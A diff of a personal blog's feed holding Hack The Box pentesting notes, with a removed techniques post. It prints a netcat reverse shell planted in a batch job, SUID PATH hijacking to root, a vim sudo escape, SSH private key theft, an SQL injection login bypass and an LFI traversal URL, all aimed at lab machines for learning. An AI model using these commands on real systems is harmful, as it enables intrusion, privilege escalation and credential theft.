+&lt;h4 id=&quot;list-users-and-groups-&quot;&gt;List users and groups &lt;a name=&quot;list-users&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;You can query all the available users in the target by querying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To retrieve the details about the current shell user, you can do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; command. It will list the groups that the user belong. This might be useful for privilege escalation.&lt;/p&gt;
+
+&lt;p&gt;You can also list the binaries the user or group has access:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-group&lt;/span&gt; bugtracker 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;search-for-interesting-keywords-&quot;&gt;Search for interesting keywords &lt;a name=&quot;search-keywords&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;You can search inside the contents of files for interesting contents (passwords):&lt;/p&gt;
+
+&lt;p&gt;Let’s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ril&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;passwd*&apos;&lt;/span&gt; /var/www/html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;-R recursive
+-i ignore case
+-l show the file, not the match&lt;/p&gt;
+
+&lt;h4 id=&quot;local-port-forwarding-&quot;&gt;Local port forwarding &lt;a name=&quot;local-port-forwarding&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.&lt;/p&gt;
+
+&lt;p&gt;With the next command, we’ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 5432:localhost:5432 christine@funnel.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;lateral-movement-&quot;&gt;Lateral movement &lt;a name=&quot;lateral-movement&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc… to switch from a low-permission user to a user with more permissions. That’s called lateral movement and it’s a step forward privilege escalation.&lt;/p&gt;
+
+&lt;h4 id=&quot;search-for-ssh-keys-&quot;&gt;Search for SSH keys &lt;a name=&quot;ssh-keys&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; folder in the user home:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/michael/.ssh/id_rsa
+c/users/daniel/.ssh/id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Paste the contents of that private key into the attacker machine and run:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod 4000 michael-id-rsa
+ssh -i michael-id-rsa michael@target.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;privilege-escalation-&quot;&gt;Privilege escalation &lt;a name=&quot;privilege-escalation&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;At this point we have shell (or reverse) access to the target machine, however, want to achieve root (or Administrator) access to the target machine. The mecanism might differ depending on the application or OS we’re exploting.&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-escalation-on-windows-&quot;&gt;Privilege escalation on Windows &lt;a name=&quot;privilege-escalation-windows&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;You can use &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng&quot;&gt;https://github.com/carlospolop/PEASS-ng&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to explot and gain admin access.&lt;/p&gt;
+
+&lt;p&gt;It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConsoleHost_history.txt&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;p&gt;Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;icacls&lt;/code&gt; command. (F) means &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Full access&lt;/code&gt; and is a promising way of privilege escalation.&lt;/p&gt;
+
+&lt;p&gt;You can potentially modify a script and make it open a reverse shell with netcat.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;og-Management&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c64.exe &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your_IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;port&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;og-Management&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ob.bat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When the script is executed, you’ll get a shell in the attacker netcat&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-escalation-on-linux-&quot;&gt;Privilege escalation on Linux &lt;a name=&quot;privilege-escalation-linux&quot;&gt;&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;First, check what permissions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; permissions the user has with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Also, check the binaries accessible to the group of the user:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-group&lt;/span&gt; bugtracker 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;set-owner-user-id-&quot;&gt;Set owner User ID &lt;a name=&quot;privilege-escalation-suid&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;If any, check the file flags and permissions:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robert@oopsie:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lisa&lt;/span&gt; /usr/bin/bugtracker &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; file /usr/bin/bugtracker
+&amp;lt;isa /usr/bin/bugtracker &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; file /usr/bin/bugtracker
+264151 12 &lt;span class=&quot;nt&quot;&gt;-rwsr-xr--&lt;/span&gt; 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/l, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The flags show &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; and file shows &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt;. That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.&lt;/p&gt;
+
+&lt;p&gt;In our case, the binary ‘bugtracker’ is owned by root &amp;amp; we can execute it as root since it has SUID set.&lt;/p&gt;
+
+&lt;p&gt;If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it’s using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robert@oopsie:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bugtracker 12
+bugtracker 12
+
+&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt;
+: EV Bug Tracker :
+&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt;
+
+Provide Bug ID: 12
+12
+&lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: /root/reports/12: No such file or directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Looks like it’s not using the full path of the cat tool. We can create a executable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; and put it before in PATH and it will execute that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; (/tmp/cat) instead of the real &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;/bin/sh&quot; &amp;gt; /tmp/cat
+robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH
+robert@oopsie:/var/www/html$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+robert@oopsie:/var/www/html$ bugtracker	
+bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 12
+12
+---------------
+
+# whoami
+whoami
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we have root access.&lt;/p&gt;
+
+&lt;h4 id=&quot;abuse-regular-application-&quot;&gt;Abuse regular application &lt;a name=&quot;privilege-escalation-app&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; shows permission for any binary, check &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;https://gtfobins.github.io/&lt;/a&gt; for a way to exploit the binary to gain root access.&lt;/p&gt;
+
+&lt;p&gt;E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vi
+:set &lt;span class=&quot;nv&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
+:shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Another case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&quot;&gt;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting tools</title><link href="https://www.agalera.eu/pentesting-tools/" rel="alternate" type="text/html" title="Pentesting tools" /><published>2022-12-16T00:00:00+01:00</published><updated>2022-12-16T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting-tools</id><content type="html" xml:base="https://www.agalera.eu/pentesting-tools/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting tools I am learning.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
@@ -349,7 +774,7 @@ activate = 1
 
 &lt;p&gt;Impacket is a collection of Python classes for working with network protocols&lt;/p&gt;
 
-&lt;p&gt;I’ve used to exploit samba and mssql.&lt;/p&gt;
+&lt;p&gt;I’ve used it to exploit samba and mssql.&lt;/p&gt;
 
 &lt;h3 id=&quot;mssqlclient&quot;&gt;mssqlclient&lt;/h3&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.95.187
@@ -384,7 +809,29 @@ SQL&amp;gt;
   &lt;li&gt;Repeater&lt;/li&gt;
   &lt;li&gt;Generating sitemap&lt;/li&gt;
   &lt;li&gt;…&lt;/li&gt;
-&lt;/ul&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python app structure</title><link href="https://www.agalera.eu/python-app-structure/" rel="alternate" type="text/html" title="Python app structure" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-app-structure</id><content type="html" xml:base="https://www.agalera.eu/python-app-structure/">&lt;p&gt;Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.&lt;/p&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;sqlmap&quot;&gt;sqlmap&lt;/h2&gt;
+
+&lt;p&gt;Checks certain url for SQL injection vulnerabilities:&lt;/p&gt;
+
+&lt;p&gt;The easiest way is to capture traffic request to the possible vulnerable URL with burp and send it to sqlmap&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -r search-request.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;if you submit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--os-shell&lt;/code&gt; flag you’ll get a shell on the target&lt;/p&gt;
+
+&lt;h2 id=&quot;interactive-shell&quot;&gt;Interactive shell&lt;/h2&gt;
+
+&lt;p&gt;When doing reverse shells, the terminal is quite shitty and it lack basic features. In order to get a better shell, we could the following commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
+----
+stty raw -echo
+fg
+export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python app structure</title><link href="https://www.agalera.eu/python-app-structure/" rel="alternate" type="text/html" title="Python app structure" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-app-structure</id><content type="html" xml:base="https://www.agalera.eu/python-app-structure/">&lt;p&gt;Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
@@ -650,250 +1097,7 @@ pipx &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;dist/example_cli-0.0.
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;example-cli hello &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test
 &lt;/span&gt;2022-12-13T15:40:23.029Z | Hello &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="python" /><category term="cli" /><category term="click" /><category term="python" /><category term="cli" /><category term="click" /><summary type="html">I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting techniques</title><link href="https://www.agalera.eu/pentesting-techniques/" rel="alternate" type="text/html" title="Pentesting techniques" /><published>2022-12-12T00:00:00+01:00</published><updated>2022-12-12T00:00:00+01:00</updated><id>https://www.agalera.eu/pentesting%20techniques</id><content type="html" xml:base="https://www.agalera.eu/pentesting-techniques/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the pentesting techniques I am learning.&lt;/p&gt;
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;resources&quot;&gt;Resources&lt;/h2&gt;
-
-&lt;p&gt;General guides on pentesting: &lt;a href=&quot;https://pentestbook.six2dez.com/&quot;&gt;https://pentestbook.six2dez.com/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;List of reverse shells: &lt;a href=&quot;https://www.revshells.com/&quot;&gt;https://www.revshells.com/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Hack tricks: &lt;a href=&quot;https://book.hacktricks.xyz/welcome/readme&quot;&gt;https://book.hacktricks.xyz/welcome/readme&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;SecLists: &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Revershe shells: &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Pentest monkey: &lt;a href=&quot;https://pentestmonkey.net/&quot;&gt;https://pentestmonkey.net/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;password-brute-force&quot;&gt;Password brute force&lt;/h2&gt;
-
-&lt;p&gt;You can try a dictionary attack to bruce force user/password combinations.&lt;/p&gt;
-
-&lt;p&gt;You can use a tool like thc-hydra: &lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;https://github.com/vanhauser-thc/thc-hydra&lt;/a&gt;. However, this will fail if there if there’s any CSRF protection.&lt;/p&gt;
-
-&lt;p&gt;In order to bypass the CSRF protection, we must do the requests from the browser. I prepared a tool to do that:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/adriangalera/pydra/&quot;&gt;https://github.com/adriangalera/pydra/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
-
-&lt;p&gt;Once we got the target IP, we must start identifying which services is running in that machine. In order to do, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; which performs port scanning and is able to identify OS, services and service versions.&lt;/p&gt;
-
-&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;directory-brute-force&quot;&gt;Directory brute force&lt;/h2&gt;
-
-&lt;p&gt;This is a technique useful to detect available paths for a web application. Also known as dir busting.&lt;/p&gt;
-
-&lt;p&gt;The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.&lt;/p&gt;
-
-&lt;p&gt;The tools to perform this is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Another option is to use sitemap functionality of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;burp&lt;/code&gt; suite&lt;/p&gt;
-
-&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;sub-domain-brute-force&quot;&gt;Sub-domain brute force&lt;/h2&gt;
-
-&lt;p&gt;This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; to perform this.&lt;/p&gt;
-
-&lt;h2 id=&quot;sql-injections&quot;&gt;SQL Injections&lt;/h2&gt;
-
-&lt;p&gt;If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.&lt;/p&gt;
-
-&lt;p&gt;A typical SQL query for a login page can look like this:&lt;/p&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:&lt;/p&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; AND password = &apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kjdfjklsdf&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now the query becomes:&lt;/p&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;therefore, the query is no longer checking for password and the login page is bypassed.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: admin&apos;#
-password: admin123 (any password will do the trick)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;You can find more SQL injections here: &lt;a href=&quot;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&quot;&gt;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;local-file-include-lfi&quot;&gt;Local File Include (LFI):&lt;/h2&gt;
-
-&lt;p&gt;Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;remote-file-include-rfi&quot;&gt;Remote File Include (RFI):&lt;/h2&gt;
-
-&lt;p&gt;Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.&lt;/p&gt;
-
